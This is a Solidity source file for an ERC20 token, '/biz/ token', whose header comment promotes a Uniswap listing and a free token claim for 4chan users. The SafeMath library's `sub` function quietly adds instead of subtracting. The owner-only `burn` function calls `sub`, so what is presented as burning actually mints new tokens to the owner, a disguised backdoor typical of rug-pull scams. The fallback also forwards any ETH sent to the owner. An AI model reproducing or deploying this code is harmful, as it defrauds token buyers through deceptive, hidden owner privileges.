/*



>/biz/ token

>website: https://www.biztoken.biz
>telegram: https://t.me/bizzzzzzzzzzzzzzzzz
>twitter: https://twitter.com/biz_token

>Total supply: 51,300 /biz/

>Uniswap pool: 40,000 /biz/ | 10 ETH
>Uniswap listing price: 0.00025 ETH

>1,300 /biz/ distributed for free to 4chan community. 13 tokens for first 100 anons
>Send 0 ETH to contract address to claim 13 /biz/ tokens



*/



pragma solidity 0.4.20;


library SafeMath {
    
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
  
  function subs(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
}

contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}

contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}

contract biz is ERC20 {
    
    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;

    string public constant name = "🍀 /BIZ/ token";
    string public constant symbol = "/BIZ/";
    uint public constant decimals = 18;
    
    uint256 public totalSupply = 51300e18;
    uint256 public totalDistributed = 0e18;
    uint256 public totalRemaining = totalSupply.subs(totalDistributed);
    uint256 value;
    uint256 public freeTokens = 1300e18;
  
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    
    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;
    
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
 
    function biz () public {
        owner = msg.sender;
        value = 13e18;
        distr(owner, totalDistributed);
    }
    
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
	
	function setFreeTokens(uint256 _amount) onlyOwner public {
		freeTokens = _amount;
    }
    

    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.subs(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    
   
    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        
        for (uint8 i = 0; i < addresses.length; i++) {
            amounts[i]=amounts[i].mul(1e18);
            require(amounts[i] <= totalRemaining);

            distr(addresses[i], amounts[i]);
            
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    
    function () external payable {
		
            getFreeTokens();
			owner.transfer(msg.value);
     }
    
    function getFreeTokens() payable canDistr public {
        
		require(value <= freeTokens);
		
        
        address investor = msg.sender;
        uint256 toGive = value;
        
        require(blacklist[investor] != true);
		
		freeTokens = freeTokens.subs(value);
        distr(investor, toGive);
        
        if (toGive > 0) {
            blacklist[investor] = true;
        }
    }

    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
	

    // mitigates the ERC20 short address attack
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
      
        balances[msg.sender] = balances[msg.sender].subs(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
      
        balances[_from] = balances[_from].subs(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].subs(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        // mitigates the ERC20 spend/approval race condition
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    function burn(uint256 _value) onlyOwner public {
        
        _value=_value.mul(1e18);
        require(msg.sender == owner);
        // no need to require value <= totalSupply, since that would imply the
        // sender's balance is greater than the totalSupply, which should be an assertion failure
        
        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
		Transfer(address(0), burner, _value);
		Burn(burner, _value);
    }
    


}